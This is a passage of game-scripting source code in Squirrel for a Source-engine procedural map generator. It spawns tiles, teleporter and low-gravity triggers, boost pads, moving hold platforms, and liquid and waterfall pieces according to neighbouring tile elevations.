			if(::TYPES[index].name=="TRAPFLOOR" || ::TYPES[index].name=="TRAPRANDOM" && RandomInt(1,4)>1)
			{
				crackbody = true;
				trapfloor = true;
				local nfdata = GetNeighboringFloorData(map,x,y,(0+index),false,true);
				index = nfdata.index;
				//elevation = nfdata.elevation;	//this borks shit
				model = nfdata.model;
			}
		}
		if(GetElevationFromNeighbors(map,x,y,true,"right",-50.00)==1.00+elevation)stepneighbors.push(180);
		if(GetElevationFromNeighbors(map,x,y,true,"left",-50.00)==1.00+elevation)stepneighbors.push(0);
		if(GetElevationFromNeighbors(map,x,y,true,"up",-50.00)==1.00+elevation)stepneighbors.push(270);
		if(GetElevationFromNeighbors(map,x,y,true,"down",-50.00)==1.00+elevation)stepneighbors.push(90);
		if(stepneighbors.len()>0)
		{
			spawndata.yaw = stepneighbors[RandomInt(0,stepneighbors.len()-1)];
			model = ::TILEVARIANTS[::TYPES[index].name][::THEME].slopehalf[RandomInt(0,::TILEVARIANTS[::TYPES[index].name][::THEME].slopehalf.len()-1)];
			if(::ANGLE_SLOPE_RACE)angleslope = true;
			local stayhalf = false;
			local checks = [	//check neighboring LADDER/CLIMB tiles, force slopehalf to stay
				{	dir= "left",		yaw= 180,	},
				{	dir= "right",		yaw= 0,		},
				{	dir= "up",			yaw= 90,	},
				{	dir= "down",		yaw= 270,	},
			];
			foreach(c in checks)
			{
				local nindex = GetMapNeighborIndex(map,x,y,c.dir);
				if(nindex==null)continue;
				if(nindex==3 || nindex==4){stayhalf=true;break;}
			}
			if(	!stayhalf &&
				spawndata.yaw==180	&& GetElevationFromNeighbors(map,x,y,true,"left",-50.00)== -1.00+elevation ||
				spawndata.yaw==0	&& GetElevationFromNeighbors(map,x,y,true,"right",-50.00)== -1.00+elevation ||
				spawndata.yaw==270	&& GetElevationFromNeighbors(map,x,y,true,"down",-50.00)== -1.00+elevation ||
				spawndata.yaw==90	&& GetElevationFromNeighbors(map,x,y,true,"up",-50.00)== -1.00+elevation)
					model = ::TILEVARIANTS[::TYPES[index].name][::THEME].slope[RandomInt(0,::TILEVARIANTS[::TYPES[index].name][::THEME].slope.len()-1)];
		}
		if(trapfloor)index = (0+trapfloor_idx);
	}
	if(::TYPES[index].name=="START_END"){
		if(current_dir=="east"&& x<=1||current_dir=="west"&&x>=MAP_SIZE||current_dir=="south"&&y>=MAP_SIZE||current_dir=="north"&&y<=1)
		elevation=start_elevation;else elevation = end_elevation;}
	if(::TYPES[index].name=="WALL")
	{
			//cap it between 0.00 - 6.00, as these are truly "safe" values
		local wall_elev_min = (0.00+::THEMES[::THEME].wallheightrand_min);
		local wall_elev_max = (0.00+::THEMES[::THEME].wallheightrand_max);
		if(wall_elev_min <= 0.00)wall_elev_min = 0.00;
		else if(wall_elev_min >= 6.00)wall_elev_min = 6.00;
		if(wall_elev_max >= 6.00)wall_elev_max = 6.00;
		if(wall_elev_max <= wall_elev_min)wall_elev_max = (0.00+wall_elev_min);
		elevation += (30.00+RandomFloat(wall_elev_min,wall_elev_max));
	}
	spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
	if(::TYPES[index].name!="TRAPFLOOR" && !trapfloor){
	if(::TYPES[index].name=="BREAKABLE" || ::TYPES[index].name=="DETAIL" || ::TYPES[index].name.find("CROUCH")==0 ||
	::TYPES[index].name=="GENERICHOLD" || ::TYPES[index].name=="ENDBUTTON" || 
	::TYPES[index].name.find("HOLD")==0 || ::TYPES[index].name.find("BUTTON")==0 || ::TYPES[index].name.find("ITEM")==0 || ::TYPES[index].name.find("TRAP")==0)
	{
		if(::TYPES[index].name=="BREAKABLE")
		{
			crackbody = true;
			breakable = true;
		}
		else if(::TYPES[index].name=="GENERICHOLD")epress = 1;
		else if(::TYPES[index].name=="ENDBUTTON")epress = 2;
		else if(::TYPES[index].name=="BUTTON_1")epress = 3;
		else if(::TYPES[index].name=="BUTTON_2")epress = 4;
		else if(::TYPES[index].name=="BUTTON_3")epress = 5;
		else if(::TYPES[index].name=="BUTTON_4")epress = 6;
		if(::TYPES[index].name.find("HOLD_1")==0)holdnameaffix = "_hold_1";
		else if(::TYPES[index].name.find("HOLD_2")==0)holdnameaffix = "_hold_2";
		else if(::TYPES[index].name.find("HOLD_3")==0)holdnameaffix = "_hold_3";
		else if(::TYPES[index].name.find("HOLD_4")==0)holdnameaffix = "_hold_4";
		local nfdata = null;
		if(::TYPES[index].name=="GENERICHOLD" || ::TYPES[index].name.find("HOLD")==0)	//new in v1_6: force first variant (should have no sprinkles/detailing on top, merging with shit)
			nfdata = GetNeighboringFloorData(map,x,y,25,false,false);
		else
			nfdata = GetNeighboringFloorData(map,x,y,25,false,true);
		local sq = {index=nfdata.index,spawnindex=(0+mapspawnindex),color=color,modelname=nfdata.model};if(::THEME=="generic")sq.isgeneric<-true;
		if(::TYPES[index].name!="CROUCH_NOFLOOR")
		endspawnqueue.push({
					_sq = sq,
					_pos = spawndata.pos,
					function Run()
					{
						::SpawnQueue.push(_sq);
						::SpawnQueueSpawner.push(_pos);
					}
				});
		if(::TYPES[index].name.find("ITEM")==0)
		{
			local psl={};
			if(::TYPES[index].name=="ITEM_H"){psl.type<-"H";psl.pos<-spawndata.pos;psl.Run<-function(){::SpawnQueueItem.push({type=type,pos=pos});}}
			else{psl.type<-"Z";psl.pos<-spawndata.pos;psl.Run<-function(){::SpawnQueueItem.push({type=type,pos=pos});}}
			endspawnqueue.push({
					_mapspawnindex = mapspawnindex,
					_ps1 = psl,
					function Run()
					{
						::MAPDATA[_mapspawnindex].postspawnlogic.push(_ps1);
					}
				});
			::process_stage.push({queue=endspawnqueue});
			return;
		}
		if(::TYPES[index].name.find("TRAP")==0 && ::TYPES[index].name!="TRAPFLOOR")
		{
			local psl={};
			psl.type<-::TYPES[index].name;
			psl.pos<-spawndata.pos;
			psl.Run<-function(){::SpawnQueueTrap.push({type=type,pos=pos});}
			endspawnqueue.push({
					_mapspawnindex = mapspawnindex,
					_ps1 = psl,
					function Run()
					{
						::MAPDATA[_mapspawnindex].postspawnlogic.push(_ps1);
					}
				});
			::process_stage.push({queue=endspawnqueue});
			return;
		}
	}
	else if(::TYPES[index].name=="START_END")
	{
		local nfdata = GetNeighboringFloorData(map,x,y,25,false,true);
		model = nfdata.model;
	}}
	if(::TYPES[index].name.find("TELEPORT")==0)
	{
		local nfdata = GetNeighboringFloorData(map,x,y,25);
		local sq = {index=nfdata.index,spawnindex=(0+mapspawnindex),color=color,modelname=nfdata.model};if(::THEME=="generic")sq.isgeneric<-true;
		endspawnqueue.push({
				_sq = sq,
				_pos = spawndata.pos,
				function Run()
				{
					::SpawnQueue.push(_sq);
					::SpawnQueueSpawner.push(_pos);
				}
			});
		if(::TYPES[index].name.find("TELEPORTDEST")==0)
		{
			endspawnqueue.push({
					_index = index,
					_mapspawnindex = mapspawnindex,
					_pos = spawndata.pos,
					function Run()
					{
						if(::TYPES[_index].name=="TELEPORTDEST_1")::MAPDATA[_mapspawnindex].tpdests_1.push(Vector(0,0,8)+_pos);
						else if(::TYPES[_index].name=="TELEPORTDEST_2")::MAPDATA[_mapspawnindex].tpdests_2.push(Vector(0,0,8)+_pos);
						else if(::TYPES[_index].name=="TELEPORTDEST_3")::MAPDATA[_mapspawnindex].tpdests_3.push(Vector(0,0,8)+_pos);
						else if(::TYPES[_index].name=="TELEPORTDEST_4")::MAPDATA[_mapspawnindex].tpdests_4.push(Vector(0,0,8)+_pos);
					}
				});
		}
		else
		{
			local tpindex = 1;
			if(::TYPES[index].name=="TELEPORT_2")tpindex = 2;
			else if(::TYPES[index].name=="TELEPORT_3")tpindex = 3;
			else if(::TYPES[index].name=="TELEPORT_4")tpindex = 4;
			endspawnqueue.push({
					_pos = spawndata.pos,
					_mapspawnindex = mapspawnindex,
					_tpindex = tpindex,
					function Run()
					{
						::Ent(Vector()+_pos,Vector(),"trigger_multiple",{
								//targetname="block_"+(0+_mapspawnindex).tostring()+"___teleporter",			//__CSS__ <og name
								targetname="___teleporter",														//__CSS__ fiddled name to allow entsearch
								spawnflags = 1,	//__CSS__ trigger client spawnflags
							},{
							tpindex = (0+_tpindex),
							mapspawnindex = (0+_mapspawnindex),
							
							
							
							//__CSS__ css4 update
							function Think(){
								if(::TELEPORT_TOGGLERATE <= 0.00)
								{
									self.AcceptInput("Enable","",null,null);
									return 2.00;
								}
								self.AcceptInput("Toggle","",null,null);
								return ::TELEPORT_TOGGLERATE;
							},
							
							
							
							
							//__CSS__ parenting to block now
							tries = 10,
								function RunParentSet()
								{
									tries--;
									if(tries <= 0)return;
										//DebugDrawBox(self.GetOrigin(),Vector(-4,-4,-4),Vector(4,4,4),0,0,255,100,1.00);
									
									local blockmaster = null;
									//for(local bmaster;bmaster=Entities.FindByClassnameWithin(bmaster,"prop_physics",self.GetOrigin(),16);)
									for(local bmaster;bmaster=Entities.FindByClassnameWithin(bmaster,"prop_dynamic",self.GetOrigin(),16);)		//__CSS__ no more physics
									{
										if(bmaster.GetModelName().find("models/luffaren/collective_teleport")==0)
										{
											blockmaster = bmaster;
											break;
										}
									}
										//printl("-------------BLOCKMASTER> "+blockmaster);
									if(blockmaster==null||!blockmaster.IsValid())
									{
										EntFireByHandle(self,"RunScriptCode"," RunParentSet(); ",1.00,null,null);
										return;
									}
									self.AcceptInput("SetParent","!activator",blockmaster,null);
										//EntFireByHandle(blockmaster,"AddOutput","rendercolor 255 0 0",0.00,null,null);
										//DebugDrawBox(blockmaster.GetOrigin(),Vector(-4,-4,-4),Vector(4,4,4),255,0,0,100,1.00);
								},
							
							function Touch(override_player=null){
								local toucher = null;
								if(override_player!=null)toucher = override_player;
								else toucher = activator;	//__CSS__ activator may get reset, store toucher
								if(toucher==null||!toucher.IsValid())return;
								
								if("_bouncecd" in toucher.GetScriptScope())return;
								toucher.GetScriptScope()._bouncecd <- true;
								EntFireByHandle(toucher,"RunScriptCode","delete _bouncecd;",0.50,null,null);
								local bounced = false;
								local curvel = toucher.GetVelocity();
								if(curvel.z < -::TELEPORT_INVERT_Z_VEL)
								{
									curvel.z *= -(::TELEPORT_INVERT_Z_AMOUNT);
									bounced = true;
								}
								if(curvel.z>::TELEPORT_ZVEL_CAP)curvel.z=(0.00+::TELEPORT_ZVEL_CAP);
								
								if(override_player!=null)
								{
									::NetProps.SetPropVector(toucher,"m_vecBaseVelocity",curvel);
									toucher.GetScriptScope()._bouncevel <- curvel;
									EntFireByHandle(toucher,"RunScriptCode","self.SetVelocity(_bouncevel);delete _bouncevel;",0.00,null,null);
								}
								else
									toucher.SetVelocity(curvel);
								
								local arr = null;
								if(tpindex==1)arr = ::MAPDATA[mapspawnindex].tpdests_1;
								else if(tpindex==2)arr = ::MAPDATA[mapspawnindex].tpdests_2;
								else if(tpindex==3)arr = ::MAPDATA[mapspawnindex].tpdests_3;
								else if(tpindex==4)arr = ::MAPDATA[mapspawnindex].tpdests_4;
								if(arr==null || arr.len()<=0)
								{
									if(bounced && ::TELEBOUNCE_SOUND!=null)
										::Sound(::TELEBOUNCE_SOUND,Vector(),toucher,-1,0.20,100,10);
									return;
								}
								
								local tptarget = arr[RandomInt(0,arr.len()-1)];
								local tpt = tptarget + Vector(0,0,::TELEPORT_BOUNCE_ZOFS);	//__CSS__ tp_bounce_offset offsets the z here, as it may otherwise keep people grounded sporadically
								
								if(override_player!=null)
								{
									toucher.GetScriptScope()._bouncepos <- Vector() + tpt;
									EntFireByHandle(toucher,"RunScriptCode","self.SetOrigin(_bouncepos);delete _bouncepos;",0.00,null,null);
								}
								else
									toucher.SetOrigin(tpt);
								if(bounced && ::TELE_B_TP_SOUND!=null)
									::Sound(::TELE_B_TP_SOUND,Vector(),toucher,-1,0.20,100,10);
								else if(!bounced && ::TELEPORT_SOUND!=null)
									::Sound(::TELEPORT_SOUND,Vector(),toucher,-1,0.20,100,10);
							},function Run(){
								EntFireByHandle(self,"RunScriptCode","AddThinkToEnt(self,\"Think\");;",0.10,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
								EntFireByHandle(self,"AddOutput","mins -"+::TELEPORT_TRIGWIDTH.tostring()+" -"+::TELEPORT_TRIGWIDTH.tostring()+" 0",0.00,null,null);
								EntFireByHandle(self,"AddOutput","maxs "+::TELEPORT_TRIGWIDTH.tostring()+" "+::TELEPORT_TRIGWIDTH.tostring()+" "+::TELEPORT_TRIGHEIGHT.tostring(),0.00,null,null);
								EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
								EntFireByHandle(self,"Enable","",0.05,null,null);
								EntFireByHandle(self,"RunScriptCode"," RunParentSet(); ",0.55,null,null);		//__CSS__ parenting to block now
							}});
					}
				});
		}
	}
	else if(::TYPES[index].name.find("LOWGRAV")==0 || ::TYPES[index].name=="AIRSLIDE")
	{
		if(::TYPES[index].name.find("LOWGRAV")==0)//LOWGRAV_SPAWN
		{
			local trigw = (0+::LOWGRAV_TRIGGER_WIDTH);
			if(::TYPES[index].name=="LOWGRAV_FLOOR")		//(new in v1_6) spawn in a floor:
			{
				trigw = 47;		//sets the trigger 'lip' so it doesn't stick outside the tile
				local fidx = GetNeighboringFloorData(map,x,y,14,false,true).index;
				while(fidx>24)fidx-=20;
				if(fidx<5)fidx=5;
				else if(fidx>24)fidx=24;
				local sq = {index=fidx,spawnindex=(0+mapspawnindex),color=color};if(::THEME=="generic")sq.isgeneric<-true;
				sq.modelname <- ::TILEVARIANTS[::TYPES[5].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[5].name][::THEME].main.len()-1)];
				endspawnqueue.push({
						_sq = sq,
						_pos = spawndata.pos,
						function Run()
						{
							::SpawnQueue.push(_sq);
							::SpawnQueueSpawner.push(_pos);
						}
					});
			}
			spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*(30));
			::Ent(Vector()+spawndata.pos,Vector(),"trigger_multiple",{targetname="lowgrav_"+(0+mapspawnindex).tostring(),spawnflags=1},{
				mapspawnindex = mapspawnindex,
				trigw = trigw,
				function Touch(start_end){
					local sc = ::ValidateGravity(activator);
					if(sc==null)return;
					if(start_end)sc.gravdata.lowgrav++;
					else sc.gravdata.lowgrav--;
					::ValidateGravityFinal(activator,sc,start_end,self);
				},function MasterTick(){
					local master = Entities.FindByNameNearest("block_"+mapspawnindex.tostring(),self.GetOrigin(),4);
					if(master!=null)
					{
						EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
						master.ValidateScriptScope();
						master.GetScriptScope().lowgrav_airslide_child <- self;
					}
					else EntFireByHandle(self,"RunScriptCode"," MasterTick(); ",1.00,null,null);
				},function Run(){
					EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
					EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
					EntFireByHandle(self,"AddOutput","mins "+(-trigw).tostring()+" "+(-trigw).tostring()+" -960",0.00,null,null);
					EntFireByHandle(self,"AddOutput","maxs "+(trigw).tostring()+" "+(trigw).tostring()+" 0",0.00,null,null);
					EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch(true);:0:-1",0.00,null,null);
					EntFireByHandle(self,"AddOutput","OnEndTouch !self:RunScriptCode:Touch(false);:0:-1",0.00,null,null);
					EntFireByHandle(self,"Enable","",0.05,null,null);
					EntFireByHandle(self,"RunScriptCode"," MasterTick(); ",1.00,null,null);
				}});
		}
		else
		{
			elevation = GetElevationFromNeighbors(map,x,y,false,"lowest",(0.00+DEFAULT_ELEVATION));
			spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
			if(::THEMES[::THEME].airslide_samerot)spawndata.yaw = 0;
			::Ent(Vector()+spawndata.pos,Vector(),"trigger_multiple",{targetname="airslide_"+(0+mapspawnindex).tostring(),spawnflags=1},{
				mapspawnindex = mapspawnindex,
				function Touch(start_end){
					local toucher = activator;
					local sc = ::ValidateGravity(toucher);
					if(sc==null)return;
					if(start_end){sc.gravdata.airslide++;sc.gravdata.airslide_trig=self;}
					else if(sc.gravdata.airslide_trig==self){sc.gravdata.airslide_trig=null;}
					else sc.gravdata.airslide--;
					//::ValidateGravityFinal(activator,sc,start_end,self);		//don't include airslide in the lowgrav-trig-check, airslide is handled differently
					::ValidateGravityFinal(toucher,sc);
				},function MasterTick(){
					local master = Entities.FindByNameNearest("block_"+mapspawnindex.tostring(),self.GetOrigin(),4);
					if(master!=null)
					{
						EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
						master.ValidateScriptScope();
						master.GetScriptScope().lowgrav_airslide_child <- self;
					}
					else EntFireByHandle(self,"RunScriptCode"," MasterTick(); ",1.00,null,null);
				},function Tick(){	//new in v1_6, helps against players falling down randomly between elevated airslide-steps
					EntFireByHandle(self,"RunScriptFunction","Tick",0.0.15,null,null);
					EntFireByHandle(self,"Disable","",0.00,null,null);
					EntFireByHandle(self,"Enable","",0.04,null,null);
				},
				function Run(){
					
					//__CSS__ airslide_workaround_funk - fixed in 'ValidateGravityFinal' now ('airslide_workaround_funk')
					//__CSS__ 32 just makes it more stable (else you sporadically fall through, wtf???)
					self.SetSize(Vector(-32,-32,::AIRSLIDE_TRIGMINS_Z),Vector(32,32,::AIRSLIDE_TRIGMAXS_Z));
					self.SetSolid(3);
					
					//self.SetSize(Vector(-48,-48,::AIRSLIDE_TRIGMINS_Z),Vector(48,48,::AIRSLIDE_TRIGMAXS_Z));
					
					
					//EntFireByHandle(self,"RunScriptCode","self.SetSolid(2);",0.00,null,null);
					//EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
					//EntFireByHandle(self,"AddOutput","mins -48 -48 "+::AIRSLIDE_TRIGMINS_Z.tostring(),0.00,null,null);
					//EntFireByHandle(self,"AddOutput","maxs 48 48 "+::AIRSLIDE_TRIGMAXS_Z.tostring(),0.00,null,null);
					EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch(true);:0:-1",0.00,null,null);
					EntFireByHandle(self,"AddOutput","OnEndTouch !self:RunScriptCode:Touch(false);:0:-1",0.00,null,null);
					EntFireByHandle(self,"Enable","",0.05,null,null);
					EntFireByHandle(self,"RunScriptCode"," MasterTick(); ",1.00,null,null);
					EntFireByHandle(self,"RunScriptFunction","Tick",0.50,null,null);
				}});
		}
	}
	if(::TYPES[index].name.find("BOOSTPAD")==0)
	{
		local nfdata = GetNeighboringFloorData(map,x,y,25);
		local yaw = 0;
		local randyaw = [0,90,180,270];
		if(::TYPES[index].name=="BOOSTPAD_JUMP")
			{yaw=randyaw[RandomInt(0,randyaw.len()-1)];}
		else if(::TYPES[index].name=="BOOSTPAD_R")
			{yaw = 180;		if(mirrored){if(current_dir=="north"||current_dir=="south")yaw+=180;}}
		else if(::TYPES[index].name=="BOOSTPAD_L")
			{yaw = 0;		if(mirrored){if(current_dir=="north"||current_dir=="south")yaw+=180;}}
		else if(::TYPES[index].name=="BOOSTPAD_U")
			{yaw = 270;		if(mirrored){if(current_dir=="east"||current_dir=="west")yaw+=180;}}
		else if(::TYPES[index].name=="BOOSTPAD_D")
			{yaw = 90;		if(mirrored){if(current_dir=="east"||current_dir=="west")yaw+=180;}}
		if(current_dir=="east")			yaw += 0;
		else if(current_dir=="west")	yaw += 180;
		else if(current_dir=="north")	yaw += 90;
		else if(current_dir=="south")	yaw += 270;
		if(mirrored && current_dir!="west" && current_dir!="east")yaw += 180;
		yaw = (0+yaw+180);
		local sq = {index=nfdata.index,spawnindex=(0+mapspawnindex),color=color,modelname=nfdata.model};if(::THEME=="generic")sq.isgeneric<-true;
		endspawnqueue.push({
				_sq = sq,
				_pos = spawndata.pos,
				_spyaw = spawndata.yaw,
				_yaw = yaw,
				_mapspawnindex = mapspawnindex,
				_index = index,
				function Run()
				{
					::SpawnQueue.push(_sq);
					::SpawnQueueSpawner.push(_pos);
					_spyaw = _yaw;
					::boostpad_spawnqueue.push({targetname="block_"+(0+_mapspawnindex).tostring(),type=::TYPES[_index].name});
					::boostpadspawnqueuespawn.push({pos=_pos,rot=Vector(0,_yaw,0)});
				}
			});
		::process_stage.push({queue=endspawnqueue});
		return;
	}
	if(::TYPES[index].name=="ASSUMEDFLOOR")
	{
		local nfdata = GetNeighboringFloorData(map,x,y,25,false,true);
		model = nfdata.model;
	}
	else if(::TYPES[index].name=="GENERICHOLD" || ::TYPES[index].name.find("HOLD")==0)
	{
		local inverted = false;
		if(::TYPES[index].name.find("INVERTED")!=null)inverted=true;
		local mmdir = "90 0 0";
		if(inverted)mmdir = "-90 0 0";
		endspawnqueue.push({
				_spawndata = spawndata,				//__CSS__thisified
				_mapspawnindex = mapspawnindex,
				mmdir = mmdir,
				inverted = inverted,
				function Run()
				{
					::movelinear_spawnqueue.push({
						position		=	Vector(),
						origin			=	""+this._spawndata.pos.x.tostring()+" "+this._spawndata.pos.y.tostring()+" "+this._spawndata.pos.z.tostring(),
						movedir			=	this.mmdir,
						movedistance	=	"148",
						speed			=	RandomFloat(::THEMES[::THEME].hold_openspeed_min,::THEMES[::THEME].hold_openspeed_max).tostring(),
						startsound		=	"",
						stopsound		=	"",
						targetname		=	"block_"+(0+this._mapspawnindex).tostring(),
						child			=	null,
						child_handled	=	false,
						inverted		=	this.inverted,
					});
				}
			});
	}
	if(::TYPES[index].name.find("LIQUID")==0 || ::TYPES[index].name.find("HAZLIQUID")==0)
	{
									//	LIQUID FLOOR LEVEL OFFSET (downwards)
									//liquid_shallow:		16
									//liquid:				240
									//liquid_stream:		120
									//liquid_fall:			240 / no floor
									//liquid_tunnel:		120
		local rot = Vector();
		if(::LIQUID_RANDROT || ::NATURE_LIQUID_RANDROT && ::TYPES[index].name.find("HAZLIQUID")==0 && ::THEME=="nature")
		{
			local ranrots = [0,90,180,270];
			rot = Vector(0,ranrots[RandomInt(0,ranrots.len()-1)],0);
		}
		spawndata.pos.z -= 8;
		elevation = GetElevationFromNeighbors(map,x,y,false,"lowest",(0.00+DEFAULT_ELEVATION));
		spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
		spawndata.pos.z -= 8;
		local liquid_drown = false;
		local is_shallow = false;
		local is_shallow_haz = false;
		if(::TYPES[index].name=="LIQUID_FALL" || ::TYPES[index].name=="HAZLIQUID_FALL")
		{
			local ntopliquid = [];
			local ntiles = [];			//neighboring valid_tiles, 		first-priority		(IF !validwaterfallfound)	(not empty/null/liquid)
			local nliquids = [];		//neighboring waters, 			second-priority
			local nliquidsmisc = [];	//neighboring non-fall waters, 	third-priority
			local nliquidsmisc2 = [];	//neighboring waters, 			fourth-priority
			local nliquidsbot = null;	//neighboring bottomwaters, 	for waterfall-bottoms
			local ntileswall = [];		//neighboring walls, 			for last-resort wallhugging
			local nliquidsbotcand = [];
			local newelevation = -50;
			local newelevation_L = -50;
			local newelevation_LOWEST = 5000;
			local newelevation_HIGHEST = -5000;
			local validwaterfallfound = false;
			local validfloorneighbors
			local checks = [
				{	dir= "left",		yaw= 180,			xofs= -1,		yofs= 0			},
				{	dir= "right",		yaw= 0,				xofs= 1,		yofs= 0			},
				{	dir= "up",			yaw= 90,			xofs= 0,		yofs= 1			},
				{	dir= "down",		yaw= 270,			xofs= 0,		yofs= -1		},
			];
			foreach(c in checks)
			{
				local nindex = GetMapNeighborIndex(map,x,y,c.dir);
				if(nindex != null)
				{
					if(::TYPES[nindex].name.find("LIQUID")==0 || ::TYPES[nindex].name.find("HAZLIQUID")==0)
					{
						if(::TYPES[nindex].name!="LIQUID_FALL" && ::TYPES[nindex].name!="HAZLIQUID_FALL")
						{
							local nelevation = GetElevationFromNeighbors(map,x+c.xofs,y+c.yofs,false,"lowest",(0.00+DEFAULT_ELEVATION));
							if(nelevation == elevation)
							{
								validwaterfallfound = true;
								newelevation_L = (0+nelevation);
								nliquids.push(c);
							}
							else if(nelevation < newelevation_LOWEST && nelevation < elevation)
							{
								newelevation_LOWEST = (0+nelevation);
							}
							if(nelevation >= newelevation_HIGHEST)
							{
								if(nelevation > newelevation_HIGHEST)
									ntopliquid.clear();
								newelevation_HIGHEST = (0+nelevation);
								ntopliquid.push(c);
							}
							nliquidsmisc.push(c);
							nliquidsbotcand.push({c=c,elevation=(0+nelevation),index=nindex,name=""+::TYPES[nindex].name});
						}
						nliquidsmisc2.push(c);
					}
					else if(nindex != 0)
					{
						if(nindex != 1)
						{
							local nelevation = GetElevation(nindex);
							if(nelevation >= newelevation)
							{
								if(nelevation > newelevation)
									ntiles.clear();
								ntiles.push(c);
								newelevation = (0+nelevation);
							}
						}
						else
							ntileswall.push(c);
					}
				}
			}
			local nres = [];
				//if(nliquids.len()>0 && validwaterfallfound){nres = nliquids;newelevation=newelevation_L;}				//OG
					//if(nliquids.len()>0 && validwaterfallfound){nres = nliquids;newelevation=newelevation_HIGHEST;} 	//some test
			if(ntopliquid.len()>0){nres = ntopliquid;newelevation=newelevation_HIGHEST;}								//new replacement, seems to work splendidly
			else if(ntiles.len()>0)nres = ntiles;
			else if(nliquids.len()>0)nres = nliquids;
			else if(nliquidsmisc.len()>0){nres = nliquidsmisc;newelevation=newelevation_HIGHEST;}
			else if(ntileswall.len()>0)nres = ntileswall;
			else if(nliquidsmisc2.len()>0)nres = nliquidsmisc2;
			if(nres.len()>0)
			{
				rot.y = nres[RandomInt(0,nres.len()-1)].yaw;
				if(newelevation > -10)
				{
					elevation = newelevation;
					spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
					spawndata.pos.z -= 8;
				}
			}
			if(nliquidsbotcand.len()>0)
			{
				nliquidsbot = null;
				local botcurel = 5000;
				foreach(cand in nliquidsbotcand)
				{
					if(cand.elevation < botcurel && cand.elevation < newelevation_HIGHEST)
					{
						nliquidsbot = cand;
						botcurel = (0+cand.elevation);
					}
				}
			}
			if(nliquidsbot != null)
			{
				local floorpos = Vector(spawndata.pos.x,spawndata.pos.y,spawndata.pos.z);
				local floorpos_ofs = 0;
				local xis_shallow = false;
				if(nliquidsbot.name=="LIQUID" || nliquidsbot.name=="HAZLIQUID")floorpos_ofs = 248;
				else if(nliquidsbot.name=="LIQUID_SHALLOW" || nliquidsbot.name=="HAZLIQUID_SHALLOW"){floorpos_ofs = 24;xis_shallow = true;}
				else if(nliquidsbot.name.find("LIQUID_STREAM")==0 || nliquidsbot.name.find("HAZLIQUID_STREAM")==0)
				{
					floorpos_ofs = 128;
					if(nliquidsbot.name.find("SHALLOW")!=null)
					{
						floorpos_ofs = 24;
						xis_shallow = true;
					}
				}
				else if(nliquidsbot.name.find("LIQUID_TUNNEL")==0 || nliquidsbot.name.find("HAZLIQUID_TUNNEL")==0)floorpos_ofs = 180;
				floorpos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),(ELEVATION*nliquidsbot.elevation)-floorpos_ofs);
				endspawnqueue.push({
						_floorpos = floorpos,
						_floorpos_ofs = floorpos_ofs,
						_mapspawnindex = mapspawnindex,
						_rot = rot,
						_nliquidsbot = nliquidsbot,
						_color = color,
						_is_shallow = xis_shallow,
						function Run()
						{
							if(_is_shallow && !::LIQUID_SHALLOW_WSPAWN){}
							else
							{
								::liquid_spawnqueue.push({type=::TYPES[_nliquidsbot.index].name,targetname="block_"+(0+_mapspawnindex).tostring()+"_liquid",rot=_rot,drown=false});
								::liquidspawnqueuespawn.push({pos=_floorpos+Vector(0,0,_floorpos_ofs-16),rot=Vector()});
							}
							local sq = {index=5,spawnindex=(0+_mapspawnindex),color=_color,modelname=
								::TILEVARIANTS[::TYPES[5].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[5].name][::THEME].main.len()-1)]};if(::THEME=="generic")sq.isgeneric<-true;
							::SpawnQueue.push(sq);
							::SpawnQueueSpawner.push(_floorpos);
						}
					});
			}
		}
		else if(::TYPES[index].name.find("LIQUID_STREAM")==0 || ::TYPES[index].name.find("HAZLIQUID_STREAM")==0)
		{
			local yaw = 0;
			local randyaw = [0,90,180,270];
			if(::TYPES[index].name=="LIQUID_STREAM" || ::TYPES[index].name=="HAZLIQUID_STREAM")
				{liquid_drown = true;yaw=randyaw[RandomInt(0,randyaw.len()-1)];}
			else if(::TYPES[index].name=="LIQUID_STREAM_SHALLOW" || ::TYPES[index].name=="HAZLIQUID_STREAM_SHALLOW")
				{liquid_drown = true;yaw=randyaw[RandomInt(0,randyaw.len()-1)];}
			else if(::TYPES[index].name.find("LIQUID_STREAM_R")==0 || ::TYPES[index].name.find("HAZLIQUID_STREAM_R")==0)
				{yaw = 0;		if(mirrored){if(current_dir=="north"||current_dir=="south")yaw+=180;}}
			else if(::TYPES[index].name.find("LIQUID_STREAM_L")==0 || ::TYPES[index].name.find("HAZLIQUID_STREAM_L")==0)
				{yaw = 180;		if(mirrored){if(current_dir=="north"||current_dir=="south")yaw+=180;}}
			else if(::TYPES[index].name.find("LIQUID_STREAM_U")==0 || ::TYPES[index].name.find("HAZLIQUID_STREAM_U")==0)
				{yaw = 90;		if(mirrored){if(current_dir=="east"||current_dir=="west")yaw+=180;}}
			else if(::TYPES[index].name.find("LIQUID_STREAM_D")==0 || ::TYPES[index].name.find("HAZLIQUID_STREAM_D")==0)
				{yaw = 270;		if(mirrored){if(current_dir=="east"||current_dir=="west")yaw+=180;}}
			if(current_dir=="east")			yaw += 0;
			else if(current_dir=="west")	yaw += 180;
			else if(current_dir=="north")	yaw += 90;
			else if(current_dir=="south")	yaw += 270;
